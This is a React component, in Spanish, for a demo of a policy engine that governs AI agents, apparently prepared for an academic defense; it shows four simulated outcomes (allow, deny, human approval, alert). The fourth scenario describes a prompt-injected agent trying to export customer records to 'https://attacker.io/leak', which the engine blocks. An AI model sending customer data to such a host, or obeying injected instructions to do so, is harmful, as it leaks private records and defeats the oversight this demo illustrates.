import React, { useState } from 'react';
import { Play, CheckCircle2, ShieldAlert, AlertTriangle, ArrowRight } from 'lucide-react';
import { Header } from '../components/Header';
import type { NavView } from '../types/domain';

interface PlaygroundViewProps {
  onTriggerApproval?: () => void;
  onNavigate?: (view: NavView) => void;
}

export const PlaygroundView: React.FC<PlaygroundViewProps> = ({ onTriggerApproval, onNavigate }) => {
  const [activeResult, setActiveResult] = useState<{
    scenario: number;
    title: string;
    decision: 'ALLOW' | 'DENY' | 'REQUIRE_APPROVAL';
    statusText: string;
    details: string;
    payload: any;
  } | null>(null);

  const runScenario1 = () => {
    setActiveResult({
      scenario: 1,
      title: 'Escenario 1: Operación Legítima Autorizada',
      decision: 'ALLOW',
      statusText: '200 OK — Invocación despachada a la API de CRM',
      details: 'El agente solicitó crear una cotización por $2,500. La política permite cotizaciones autónomas hasta $10,000.',
      payload: {
        agent_id: 'agt_sales_01',
        action: 'create_quote',
        context: { amount: 2500, customer_id: 'cus_991' },
        decision: 'ALLOW',
        evaluation_latency_ms: 18.4,
      },
    });
  };

  const runScenario2 = () => {
    setActiveResult({
      scenario: 2,
      title: 'Escenario 2: Abuso de Privilegio Bloqueado',
      decision: 'DENY',
      statusText: '403 Forbidden — Acción prohibida por política de catálogo',
      details: 'El agente intentó alterar el precio unitario a $10. La política "Protect product pricing" prohíbe modificaciones no delegadas.',
      payload: {
        agent_id: 'agt_sales_01',
        action: 'update_price',
        context: { new_price: 10, product_id: 'prod_44' },
        decision: 'DENY',
        reason: 'PolicyViolation: Agent does not possess role:PRICING_MANAGER',
        evaluation_latency_ms: 12.1,
      },
    });
  };

  const runScenario3 = () => {
    if (onTriggerApproval) {
      onTriggerApproval();
    }
    setActiveResult({
      scenario: 3,
      title: 'Escenario 3: Operación Sensible en Espera (HITL)',
      decision: 'REQUIRE_APPROVAL',
      statusText: '202 Accepted — Ejecución suspendida esperando autorización humana',
      details: 'El agente solicitó un reembolso por $4,500. La regla exige intervención humana para montos >= $500. La solicitud fue enviada al Approvals Inbox.',
      payload: {
        agent_id: 'agt_finance_02',
        action: 'refund.create',
        context: { amount: 4500, gateway: 'stripe' },
        decision: 'REQUIRE_APPROVAL',
        approval_id: 'appr_demo_live',
        timeout_seconds: 900,
        evaluation_latency_ms: 22.8,
      },
    });
  };

  const runScenario4 = () => {
    setActiveResult({
      scenario: 4,
      title: 'Escenario 4: Prompt Injection y Exfiltración Detectada',
      decision: 'DENY',
      statusText: '403 Forbidden + ALERTA ROJA — Intento de violación de seguridad',
      details: 'El agente intentó exportar la base de clientes hacia un servidor externo desconocido (attacker.io). El PDP bloqueó el acceso y disparó un evento de alerta crítica.',
      payload: {
        agent_id: 'agt_data_05',
        action: 'export_customers',
        context: { destination: 'https://attacker.io/leak', records: 2841 },
        decision: 'DENY',
        alert_raised: true,
        severity: 'CRITICAL',
        evaluation_latency_ms: 14.7,
      },
    });
  };

  return (
    <div style={{ display: 'flex', flexDirection: 'column', height: '100%', overflow: 'hidden' }}>
      <Header 
        title="Playground & Simulador de Demo" 
        subtitle="Entorno de prueba interactivo para disparar los 4 escenarios de la defensa ante la cátedra."
      />

      <div style={{ flex: 1, padding: '24px 28px', overflowY: 'auto' }}>
        {/* Scenarios Grid */}
        <div style={{
          display: 'grid',
          gridTemplateColumns: 'repeat(4, 1fr)',
          gap: '16px',
          marginBottom: '24px',
        }}>
          {/* Scenario 1 Button */}
          <div 
            onClick={runScenario1}
            className="card"
            style={{
              cursor: 'pointer',
              border: activeResult?.scenario === 1 ? '1px solid #10B981' : '1px solid var(--border-subtle)',
              backgroundColor: activeResult?.scenario === 1 ? '#112220' : 'var(--bg-card)',
              transition: 'all 0.15s ease',
            }}
          >
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '10px' }}>
              <span className="badge badge-success">ALLOW</span>
              <Play size={14} color="#10B981" />
            </div>
            <h3 style={{ fontSize: '13px', fontWeight: 700, color: 'var(--text-primary)' }}>
              1. Cotización ($2,500)
            </h3>
            <p style={{ fontSize: '11px', color: 'var(--text-muted)', marginTop: '4px' }}>
              create_quote dentro del umbral permitido.
            </p>
          </div>

          {/* Scenario 2 Button */}
          <div 
            onClick={runScenario2}
            className="card"
            style={{
              cursor: 'pointer',
              border: activeResult?.scenario === 2 ? '1px solid #EF4444' : '1px solid var(--border-subtle)',
              backgroundColor: activeResult?.scenario === 2 ? '#24141A' : 'var(--bg-card)',
              transition: 'all 0.15s ease',
            }}
          >
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '10px' }}>
              <span className="badge badge-danger">DENY</span>
              <Play size={14} color="#EF4444" />
            </div>
            <h3 style={{ fontSize: '13px', fontWeight: 700, color: 'var(--text-primary)' }}>
              2. Precio Ilegítimo ($10)
            </h3>
            <p style={{ fontSize: '11px', color: 'var(--text-muted)', marginTop: '4px' }}>
              update_price bloqueado por falta de rol.
            </p>
          </div>

          {/* Scenario 3 Button */}
          <div 
            onClick={runScenario3}
            className="card"
            style={{
              cursor: 'pointer',
              border: activeResult?.scenario === 3 ? '1px solid #F59E0B' : '1px solid var(--border-subtle)',
              backgroundColor: activeResult?.scenario === 3 ? '#241E11' : 'var(--bg-card)',
              transition: 'all 0.15s ease',
            }}
          >
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '10px' }}>
              <span className="badge badge-warning">APPROVAL</span>
              <Play size={14} color="#F59E0B" />
            </div>
            <h3 style={{ fontSize: '13px', fontWeight: 700, color: 'var(--text-primary)' }}>
              3. Reembolso ($4,500)
            </h3>
            <p style={{ fontSize: '11px', color: 'var(--text-muted)', marginTop: '4px' }}>
              refund excede $500 y activa HITL.
            </p>
          </div>

          {/* Scenario 4 Button */}
          <div 
            onClick={runScenario4}
            className="card"
            style={{
              cursor: 'pointer',
              border: activeResult?.scenario === 4 ? '1px solid #EF4444' : '1px solid var(--border-subtle)',
              backgroundColor: activeResult?.scenario === 4 ? '#281216' : 'var(--bg-card)',
              transition: 'all 0.15s ease',
            }}
          >
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '10px' }}>
              <span className="badge badge-danger">DENY + ALERT</span>
              <Play size={14} color="#EF4444" />
            </div>
            <h3 style={{ fontSize: '13px', fontWeight: 700, color: 'var(--text-primary)' }}>
              4. Prompt Injection
            </h3>
            <p style={{ fontSize: '11px', color: 'var(--text-muted)', marginTop: '4px' }}>
              export_customers bloqueado y alerta disparada.
            </p>
          </div>
        </div>

        {/* Live Evaluation Monitor Result */}
        {activeResult ? (
          <div className="card" style={{ padding: '24px' }}>
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '16px' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                {activeResult.decision === 'ALLOW' && <CheckCircle2 size={24} color="#10B981" />}
                {activeResult.decision === 'DENY' && <ShieldAlert size={24} color="#EF4444" />}
                {activeResult.decision === 'REQUIRE_APPROVAL' && <AlertTriangle size={24} color="#F59E0B" />}
                <div>
                  <h2 style={{ fontSize: '16px', fontWeight: 700, color: 'var(--text-primary)' }}>
                    {activeResult.title}
                  </h2>
                  <div style={{ fontSize: '12px', color: 'var(--text-secondary)', marginTop: '2px' }}>
                    {activeResult.statusText}
                  </div>
                </div>
              </div>

              {activeResult.decision === 'REQUIRE_APPROVAL' && onNavigate && (
                <button 
                  onClick={() => onNavigate('approvals')}
                  className="btn btn-primary"
                  style={{ display: 'flex', alignItems: 'center', gap: '8px' }}
                >
                  <span>Ir a Aprobar en Inbox</span>
                  <ArrowRight size={14} />
                </button>
              )}
            </div>

            <p style={{ fontSize: '13px', color: 'var(--text-secondary)', marginBottom: '16px', lineHeight: '1.5' }}>
              {activeResult.details}
            </p>

            {/* JSON Output Payload */}
            <div>
              <div style={{ fontSize: '11px', color: 'var(--text-muted)', textTransform: 'uppercase', letterSpacing: '0.05em', marginBottom: '8px' }}>
                AUDIT PAYLOAD (INTERCEPTOR PEP / PDP)
              </div>
              <pre style={{
                backgroundColor: '#0A0E17',
                border: '1px solid #1E293B',
                borderRadius: '8px',
                padding: '14px',
                fontFamily: 'var(--font-mono)',
                fontSize: '12px',
                color: '#38BDF8',
                overflowX: 'auto',
              }}>
                {JSON.stringify(activeResult.payload, null, 2)}
              </pre>
            </div>
          </div>
        ) : (
          <div style={{
            padding: '40px',
            textAlign: 'center',
            backgroundColor: 'var(--bg-card)',
            border: '1px solid var(--border-subtle)',
            borderRadius: '10px',
            color: 'var(--text-muted)',
          }}>
            <Play size={32} color="#38BDF8" style={{ margin: '0 auto 12px auto', display: 'block' }} />
            <h3 style={{ fontSize: '15px', color: 'var(--text-primary)', fontWeight: 600 }}>
              Simulador Listo para la Demostración
            </h3>
            <p style={{ fontSize: '13px', marginTop: '4px', maxWidth: '480px', margin: '4px auto 0 auto' }}>
              Haz clic en cualquiera de las 4 tarjetas superiores para disparar la evaluación de reglas del motor PDP y ver la respuesta en tiempo real.
            </p>
          </div>
        )}
      </div>
    </div>
  );
};
